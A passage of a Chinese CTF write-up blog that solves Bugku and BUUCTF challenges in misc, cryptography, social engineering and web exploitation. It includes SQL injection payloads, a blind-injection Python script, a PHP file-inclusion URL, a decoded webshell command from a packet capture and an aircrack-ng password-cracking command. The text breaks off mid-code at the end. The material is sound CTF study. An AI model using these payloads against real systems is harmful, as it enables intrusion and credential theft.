title=\"strpos数组绕过\"></a>strpos数组绕过</h2><p>还是数字绕过 <code>?ctf[]=1234</code></p>\n<h1 id=\"杂项-1\"><a href=\"#杂项-1\" class=\"headerlink\" title=\"杂项\"></a>杂项</h1><h2 id=\"眼见非实-ISCCCTF\"><a href=\"#眼见非实-ISCCCTF\" class=\"headerlink\" title=\"眼见非实(ISCCCTF)\"></a>眼见非实(ISCCCTF)</h2><p>看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。</p>\n<h2 id=\"又一张图片，还单纯吗\"><a href=\"#又一张图片，还单纯吗\" class=\"headerlink\" title=\"又一张图片，还单纯吗\"></a>又一张图片，还单纯吗</h2><p>binwalk跑一下发现有两个图片，切一下即可<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"宽带信息泄露\"><a href=\"#宽带信息泄露\" class=\"headerlink\" title=\"宽带信息泄露\"></a>宽带信息泄露</h2><p>百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。</p>\n<h2 id=\"隐写2\"><a href=\"#隐写2\" class=\"headerlink\" title=\"隐写2\"></a>隐写2</h2><p>binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。</p>\n<h2 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h2><p>直接解压，然后有个flag文件，hex里面找一下key即可。</p>\n<h2 id=\"中国菜刀\"><a href=\"#中国菜刀\" class=\"headerlink\" title=\"中国菜刀\"></a>中国菜刀</h2><p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">@ini_set(<span class=\"string\">\"display_errors\"</span>,<span class=\"string\">\"0\"</span>);</span><br><span class=\"line\">@set_time_limit(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(PHP_VERSION&lt;<span class=\"string\">'5.3.0'</span>)&#123;</span><br><span class=\"line\">\t@set_magic_quotes_runtime0);</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">echo</span>(<span class=\"string\">\"X@Y\"</span>);</span><br><span class=\"line\">$F=<span class=\"string\">'C:\\\\wwwroot\\\\3.php'</span>;</span><br><span class=\"line\">$P=@fopen($F,<span class=\"string\">'r'</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span>(@fread($P,filesize($F)));</span><br><span class=\"line\">@fclose($P);;<span class=\"keyword\">echo</span>(<span class=\"string\">\"X@Y\"</span>);<span class=\"keyword\">die</span>();</span><br></pre></td></tr></table></figure></p>\n<p>这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流</p>\n<p><img src=\"/2018/04/03/bugku-writeup%E7%BB%AD/2.png\" alt></p>\n<p>这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag</p>\n<h2 id=\"这么多数据包\"><a href=\"#这么多数据包\" class=\"headerlink\" title=\"这么多数据包\"></a>这么多数据包</h2><p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p>\n<h2 id=\"隐写3\"><a href=\"#隐写3\" class=\"headerlink\" title=\"隐写3\"></a>隐写3</h2><p>改变图片高度即可</p>\n<h2 id=\"想蹭网先解开密码\"><a href=\"#想蹭网先解开密码\" class=\"headerlink\" title=\"想蹭网先解开密码\"></a>想蹭网先解开密码</h2><p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">aircrack-ng wifi.cap -w passwd.txt</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2018/04/03/bugku-writeup%E7%BB%AD/3.png\" alt></p>\n<h2 id=\"linux2\"><a href=\"#linux2\" class=\"headerlink\" title=\"linux2\"></a>linux2</h2><p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">strings brave &gt; a.txt</span><br></pre></td></tr></table></figure>\n<p>然后在a.txt中搜索一下 <code>key</code>，直接出现了flag</p>\n<h2 id=\"账号被盗了-1\"><a href=\"#账号被盗了-1\" class=\"headerlink\" title=\"账号被盗了\"></a>账号被盗了</h2><p>这题不会…</p>\n<h2 id=\"聪明的大象\"><a href=\"#聪明的大象\" class=\"headerlink\" title=\"聪明的大象\"></a>聪明的大象</h2><p>解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag</p>\n<h1 id=\"web进阶\"><a href=\"#web进阶\" class=\"headerlink\" title=\"web进阶\"></a>web进阶</h1><h2 id=\"实战2-注入\"><a href=\"#实战2-注入\" class=\"headerlink\" title=\"实战2-注入\"></a>实战2-注入</h2><p>打开后发现news页面有id参数，加引号可以报错注入<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?id&#x3D;18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 21,1),0x7e),1)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"Trim的日记本\"><a href=\"#Trim的日记本\" class=\"headerlink\" title=\"Trim的日记本\"></a>Trim的日记本</h2><p>扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。</p>\n<h1 id=\"社工\"><a href=\"#社工\" class=\"headerlink\" title=\"社工\"></a>社工</h1><h2 id=\"社工进阶\"><a href=\"#社工进阶\" class=\"headerlink\" title=\"社工进阶\"></a>社工进阶</h2><p>百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code></p>\n<h2 id=\"信息查找\"><a href=\"#信息查找\" class=\"headerlink\" title=\"信息查找\"></a>信息查找</h2><p>直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。</p>\n<h2 id=\"简单个人信息收集\"><a href=\"#简单个人信息收集\" class=\"headerlink\" title=\"简单个人信息收集\"></a>简单个人信息收集</h2><p>首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。</p>\n<h2 id=\"简单的社工尝试\"><a href=\"#简单的社工尝试\" class=\"headerlink\" title=\"简单的社工尝试\"></a>简单的社工尝试</h2><p>google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。</p>\n<h1 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h1><h2 id=\"简单加密\"><a href=\"#简单加密\" class=\"headerlink\" title=\"简单加密\"></a>简单加密</h2><p>凯撒移位，代码</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cipher = <span class=\"string\">'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">-70</span>,<span class=\"number\">32</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">\t\t<span class=\"comment\"># print(ord(j)+i)</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (ord(j)+i) &gt; <span class=\"number\">132</span> <span class=\"keyword\">or</span> (ord(j)+i) &lt; <span class=\"number\">33</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span> </span><br><span class=\"line\">\t\tprint(chr(ord(j)+i),end=<span class=\"string\">\"\"</span>)</span><br><span class=\"line\">\tprint(<span class=\"string\">'\\n'</span>)</span><br></pre></td></tr></table></figure>\n<h2 id=\"一段base64\"><a href=\"#一段base64\" class=\"headerlink\" title=\"一段base64\"></a>一段base64</h2><p>多层解码，贴上代码:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">from</span> urllib <span class=\"keyword\">import</span> parse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> open(<span class=\"string\">'base64.txt'</span>) <span class=\"keyword\">as</span> file:</span><br><span class=\"line\">\t<span class=\"comment\"># base64解码</span></span><br><span class=\"line\">\ttext = file.read()</span><br><span class=\"line\">\ttext = base64.b64decode(text)</span><br><span class=\"line\">\ttext = text.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">\talp = re.findall(<span class=\"string\">r'([0-7]+)'</span>,text)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># base64解码后发现像8进制，8进制转换成10进制</span></span><br><span class=\"line\">\tnew_alp = []</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> alp:</span><br><span class=\"line\">\t\tnew_alp.append(int(item,<span class=\"number\">8</span>))</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># ascii解码\t</span></span><br><span class=\"line\">\talp = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> new_alp:</span><br><span class=\"line\">\t\talp += str(chr(i))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># 前面的解码后为'\\xdd'的形式，推测为16进制\t</span></span><br><span class=\"line\">\tplain = <span class=\"string\">''</span></span><br><span class=\"line\">\tcipher = re.findall(<span class=\"string\">r'\\\\x([0-9a-f]+)'</span>,alp)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">\t\tplain += str(chr(int(i,<span class=\"number\">16</span>)))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># unicode解码</span></span><br><span class=\"line\">\tcipher2 = bytes(plain,encoding=<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">\tplain2 = cipher2.decode(<span class=\"string\">'unicode-escape'</span>)</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\"># ascii解码</span></span><br><span class=\"line\">\tcipher3 = re.findall(<span class=\"string\">r'[0-9]&#123;2,&#125;'</span>,plain2)</span><br><span class=\"line\">\tplain3 = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher3:</span><br><span class=\"line\">\t\tplain3 += chr(int(i))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># unicode解码</span></span><br><span class=\"line\">\tcipher4 = re.findall(<span class=\"string\">r'#x([0-9a-f]+)'</span>,plain3)</span><br><span class=\"line\">\tplain4 = []</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher4:</span><br><span class=\"line\">\t\tplain4.append(int(i,<span class=\"number\">16</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># ascii解码</span></span><br><span class=\"line\">\tcipher5 = plain4</span><br><span class=\"line\">\tplain5 = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher5:</span><br><span class=\"line\">\t\tplain5 += chr(i)</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># unicode</span></span><br><span class=\"line\">\tcipher6 = re.findall(<span class=\"string\">r'&amp;#([0-9]&#123;2,&#125;)'</span>,plain5)</span><br><span class=\"line\">\tplain6 = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher6:</span><br><span class=\"line\">\t\tplain6 += chr(int(i))</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\"># urldecode</span></span><br><span class=\"line\">\tprint(parse.unquote(plain6))</span><br></pre></td></tr></table></figure>\n<h2 id=\"‘\"><a href=\"#‘\" class=\"headerlink\" title=\"‘!?\"></a>‘!?</h2><p>看了别人的wp，这题还是Ook!语言跑一下</p>\n<h2 id><a href=\"#\" class=\"headerlink\" title=\"+[]-\"></a>+[]-</h2><p>brainfuck语言跑一下</p>\n<h2 id=\"奇怪的密码\"><a href=\"#奇怪的密码\" class=\"headerlink\" title=\"奇怪的密码\"></a>奇怪的密码</h2><p>其实就是把flag的每一位的ascii值一次加1,2,3,..反过来解一下就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">cipher = <span class=\"string\">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class=\"line\">plain = <span class=\"string\">''</span></span><br><span class=\"line\">seq = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> cipher:</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> i == <span class=\"string\">'€'</span>:     <span class=\"comment\"># 该字符为非法字符，不去掉的话可能会报错</span></span><br><span class=\"line\">\t\tseq += <span class=\"number\">1</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\tplain += chr((ord(i) - seq))</span><br><span class=\"line\">\tseq += <span class=\"number\">1</span></span><br><span class=\"line\">print(plain)</span><br></pre></td></tr></table></figure>\n<h2 id=\"托马斯杰斐逊\"><a href=\"#托马斯杰斐逊\" class=\"headerlink\" title=\"托马斯杰斐逊\"></a>托马斯杰斐逊</h2><p>根据提示可知是杰斐逊圆盘加密，附上解密脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">tomas = <span class=\"string\">'''ZWAXJGDLUBVIQHKYPNTCRMOSFE</span></span><br><span class=\"line\"><span class=\"string\">KPBELNACZDTRXMJQOYHGVSFUWI</span></span><br><span class=\"line\"><span class=\"string\">BDMAIZVRNSJUWFHTEQGYXPLOCK</span></span><br><span class=\"line\"><span class=\"string\">RPLNDVHGFCUKTEBSXQYIZMJWAO</span></span><br><span class=\"line\"><span class=\"string\">IHFRLABEUOTSGJVDKCPMNZQWXY</span></span><br><span class=\"line\"><span class=\"string\">AMKGHIWPNYCJBFZDRUSLOQXVET</span></span><br><span class=\"line\"><span class=\"string\">GWTHSPYBXIZULVKMRAFDCEONJQ</span></span><br><span class=\"line\"><span class=\"string\">NOZUTWDCVRJLXKISEFAPMYGHBQ</span></span><br><span class=\"line\"><span class=\"string\">QWATDSRFHENYVUBMCOIKZGJXPL</span></span><br><span class=\"line\"><span class=\"string\">WABMCXPLTDSRJQZGOIKFHENYVU</span></span><br><span class=\"line\"><span class=\"string\">XPLTDAOIKFZGHENYSRUBMCQWVJ</span></span><br><span class=\"line\"><span class=\"string\">TDSWAYXPLVUBOIKZGJRFHENMCQ</span></span><br><span class=\"line\"><span class=\"string\">BMCSRFHLTDENQWAOXPYVUIKZGJ</span></span><br><span class=\"line\"><span class=\"string\">XPHKZGJTDSENYVUBMLAOIRFCQW</span></span><br><span class=\"line\"><span class=\"string\">'''</span></span><br><span class=\"line\">new_tomas = []</span><br><span class=\"line\">tmp = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(tomas)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> tomas[i] == <span class=\"string\">'\\n'</span>:</span><br><span class=\"line\">\t\tnew_tomas.append(tmp)</span><br><span class=\"line\">\t\ttmp = <span class=\"string\">''</span></span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\ttmp += tomas[i]</span><br><span class=\"line\">key =  [<span class=\"number\">2</span>,<span class=\"number\">5</span>,<span class=\"number\">1</span>,<span class=\"number\">3</span>,<span class=\"number\">6</span>,<span class=\"number\">4</span>,<span class=\"number\">9</span>,<span class=\"number\">7</span>,<span class=\"number\">8</span>,<span class=\"number\">14</span>,<span class=\"number\">10</span>,<span class=\"number\">13</span>,<span class=\"number\">11</span>,<span class=\"number\">12</span>]</span><br><span class=\"line\">cipher = <span class=\"string\">'HCBTSXWCRQGLES'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> index <span class=\"keyword\">in</span> range(len(cipher)):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> range(<span class=\"number\">26</span>):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> new_tomas[key[index]<span class=\"number\">-1</span>][p] == cipher[index]:</span><br><span class=\"line\">\t\t\tnew_tomas[key[index]<span class=\"number\">-1</span>] = new_tomas[key[index]<span class=\"number\">-1</span>][p:] + new_tomas[key[index]<span class=\"number\">-1</span>][:p]</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> key:</span><br><span class=\"line\">\tprint(new_tomas[item<span class=\"number\">-1</span>][<span class=\"number\">-6</span>:]+new_tomas[item<span class=\"number\">-1</span>][:<span class=\"number\">-6</span>])   <span class=\"comment\"># 让输出更明显一点</span></span><br></pre></td></tr></table></figure>\n<p>输出如下</p>\n<blockquote>\n<p>XMJQOYHGVSFUWIKPBELNACZDTR<br>SGJVDKCPMNZQWXYIHFRLABEUOT<br>XJGDLUBVIQHKYPNTCRMOSFEZWA<br>SJUWFHTEQGYXPLOCKBDMAIZVRN<br>BFZDRUSLOQXVETAMKGHIWPNYCJ<br>UKTEBSXQYIZMJWAORPLNDVHGFC<br>GJXPLQWATDSRFHENYVUBMCOIKZ<br>KMRAFDCEONJQGWTHSPYBXIZULV<br>UTWDCVRJLXKISEFAPMYGHBQNOZ<br>AOIRFCQWXPHKZGJTDSENYVUBML<br>DSRJQZGOIKFHENYVUWABMCXPLT<br>MCSRFHLTDENQWAOXPYVUIKZGJB<br>IKFZGHENYSRUBMCQWVJXPLTDAO<br>NMCQTDSWAYXPLVUBOIKZGJRFHE</p>\n</blockquote>\n<p>好像默认是按照第7位来当做密文，所以我特地按照这个格式来，那么第一列就是明文了，注意flag要求小写。</p>\n<h2 id=\"zip伪加密\"><a href=\"#zip伪加密\" class=\"headerlink\" title=\"zip伪加密\"></a>zip伪加密</h2><p>已经说了是zip伪加密，直接16进制修改一下即可</p>\n<h2 id=\"告诉你个秘密-ISCCCTF\"><a href=\"#告诉你个秘密-ISCCCTF\" class=\"headerlink\" title=\"告诉你个秘密(ISCCCTF)\"></a>告诉你个秘密(ISCCCTF)</h2><p>看字符串像16进制，转成字符串可以看到像base64，再解码一次</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">r5yG lp9I BjM tFhBT6uh y7iJ QsZ bhM</span><br></pre></td></tr></table></figure>\n<p>这是键盘对应的码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">TONGYUAN</span><br></pre></td></tr></table></figure>\n<p>注意本题没有说明flag的提交方式，应该是 <code>flag:TONGYUAN</code></p>\n<h2 id=\"来自宇宙的信号\"><a href=\"#来自宇宙的信号\" class=\"headerlink\" title=\"来自宇宙的信号\"></a>来自宇宙的信号</h2><p>既然说了是银河战队，直接百度搜 <code>银河 文字</code>，会看到第一个结果赫然是标准银河字母，对照一下就可以了。</p>\n<p>至此，所有加密题目OK。</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"BUUCTF_WEB(一)","url":"/2020/04/02/buuctf/","content":"<p>今年寒假真的太长了，后半年又因为考研什么都没学，趁这段时间复现学习一波~</p>\n<a id=\"more\"></a>\n<h1 id=\"极客大挑战-2019-EasySQL\"><a href=\"#极客大挑战-2019-EasySQL\" class=\"headerlink\" title=\"[极客大挑战 2019]EasySQL\"></a>[极客大挑战 2019]EasySQL</h1><p>简单的万能密码即可登录</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;b8506b10-95f5-4f01-b77a-8485ee19e068.node3.buuoj.cn&#x2F;check.php?username&#x3D;admin%27+or+1%23&amp;password&#x3D;fads</span><br></pre></td></tr></table></figure>\n<h1 id=\"极客大挑战-2019-Havefun\"><a href=\"#极客大挑战-2019-Havefun\" class=\"headerlink\" title=\"[极客大挑战 2019]Havefun\"></a>[极客大挑战 2019]Havefun</h1><p>签到题，查看网页源代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!--</span><br><span class=\"line\">        $cat=$_GET[<span class=\"string\">'cat'</span>];</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> $cat;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($cat==<span class=\"string\">'dog'</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">'Syc&#123;cat_cat_cat_cat&#125;'</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        --&gt;</span><br></pre></td></tr></table></figure>\n<p>然后提交get参数<code>cat=dog</code>即可getflag</p>\n<h1 id=\"极客大挑战-2019-FinalSQL\"><a href=\"#极客大挑战-2019-FinalSQL\" class=\"headerlink\" title=\"[极客大挑战 2019]FinalSQL\"></a>[极客大挑战 2019]FinalSQL</h1><p>本题是一个数字型注入，注入点在<code>id</code>参数，过滤了部分敏感词，如<code>and</code>，<code>空格</code>等，使用异或符号可以正常返回数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">id&#x3D;0^(1)</span><br></pre></td></tr></table></figure>\n<p>所以可以据此进行盲注，但是题目过滤了空格，经过尝试发现空格无法用特殊字符绕过，不过此处可以使用无空格方式来注入，即通过括号包裹来避免使用空格，比如：<br><figure class=\"highlight sql\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">select</span>(*)<span class=\"keyword\">from</span>(<span class=\"keyword\">admin</span>);</span><br></pre></td></tr></table></figure></p>\n<p>盲注脚本如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">base_url = <span class=\"string\">'http://33afb64c-ecb9-427b-b24e-100dbb7dd810.node3.buuoj.cn/search.php'</span></span><br><span class=\"line\">ws = string.printable[:<span class=\"number\">-6</span>]</span><br><span class=\"line\">sign = <span class=\"string\">\"NO! Not this\"</span></span><br><span class=\"line\">table_name = <span class=\"string\">\"F1naI1y,Flaaaaag\"</span></span><br><span class=\"line\"><span class=\"comment\"># column_name = 'id,fl4gawsl'   Flaaag</span></span><br><span class=\"line\"><span class=\"comment\"># column_name = 'id,username,password'</span></span><br><span class=\"line\">column_name = <span class=\"string\">'mygodcl4y_is_really_amazing,welco'</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> ws:</span><br><span class=\"line\">        <span class=\"comment\"># payload1 = \"?id=0^(select(ascii(substr((select(group_concat(table_name))from(information_schema.tables)\"\\</span></span><br><span class=\"line\">            <span class=\"comment\"># \"where(table_schema=database())),&#123;&#125;,1))=&#123;&#125;))\"</span></span><br><span class=\"line\">        <span class=\"comment\"># payload2 = \"?id=0^(select(ascii(substr((select(group_concat(column_name))from(information_schema.columns)\"\\</span></span><br><span class=\"line\">            <span class=\"comment\"># \"where(table_name='F1naI1y')),&#123;&#125;,1))=&#123;&#125;))\"</span></span><br><span class=\"line\">        payload2 = <span class=\"string\">\"?id=0^(select(ascii(substr((select(group_concat(username,password))from(F1naI1y)),&#123;&#125;,1))=&#123;&#125;))\"</span></span><br><span class=\"line\">        res = requests.get(base_url + payload2.format(len(column_name)+<span class=\"number\">1</span>, ord(i))).content.decode(<span class=\"string\">'utf-8'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> sign <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">            column_name += i</span><br><span class=\"line\">            print(column_name)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>不得不吐槽一下的是flag所在表数据真的有点长，我都怀疑flag是不是不在这个表里面，如果只跑password字段的话应该会短一点</p>\n<p><img src=\"/2020/04/02/buuctf/21.png\" alt></p>\n<h1 id=\"极客大挑战-2019-Secret-File\"><a href=\"#极客大挑战-2019-Secret-File\" class=\"headerlink\" title=\"[极客大挑战 2019]Secret File\"></a>[极客大挑战 2019]Secret File</h1><p>打开网站之后查看源代码可以看到提示<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;a id&#x3D;&quot;master&quot; href&#x3D;&quot;.&#x2F;Archive_room.php&quot; style&#x3D;&quot;background-color:#000000;height:70px;width:200px;color:black;left:44%;cursor:default;&quot;&gt;Oh! You found me&lt;&#x2F;a&gt;</span><br></pre></td></tr></table></figure><br>访问Archive_room.php，题目提示<code>没看清么？请回去仔细看看</code>，应该是发生了跳转，抓包，发现了新的页面<code>secr3t.php</code>，访问得到源代码<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">    &lt;title&gt;secret&lt;/title&gt;</span><br><span class=\"line\">    &lt;meta charset=<span class=\"string\">\"UTF-8\"</span>&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">    $file=$_GET[<span class=\"string\">'file'</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(strstr($file,<span class=\"string\">\"../\"</span>)||stristr($file, <span class=\"string\">\"tp\"</span>)||stristr($file,<span class=\"string\">\"input\"</span>)||stristr($file,<span class=\"string\">\"data\"</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">\"Oh no!\"</span>;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">include</span>($file); </span><br><span class=\"line\"><span class=\"comment\">//flag放在了flag.php里</span></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>然后就是文件包含<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;a74e337d-43ce-4de5-af4a-08d701cec8b1.node3.buuoj.cn&#x2F;secr3t.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure><br>解码即可得到flag</p>\n<h1 id=\"极客大挑战-2019-PHP\"><a href=\"#极客大挑战-2019-PHP\" class=\"headerlink\" title=\"[极客大挑战 2019]PHP\"></a>[极客大挑战 2019]PHP</h1><p>题目提示了网站备份，随手测试www.zip可以down到源码<br>查看index.php发现存在反序列化<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">include</span> <span class=\"string\">'class.php'</span>;</span><br><span class=\"line\">    $select = $_GET[<span class=\"string\">'select'</span>];</span><br><span class=\"line\">    $res=unserialize(@$select);</span><br><span class=\"line\">    <span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure><br>查看class.php<br><figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">'flag.php'</span>;</span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Name</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $username = <span class=\"string\">'nonono'</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> $password = <span class=\"string\">'yesyes'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($username,$password)</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = $username;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;password = $password;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">$this</span>-&gt;username = <span class=\"string\">'guest'</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;password != <span 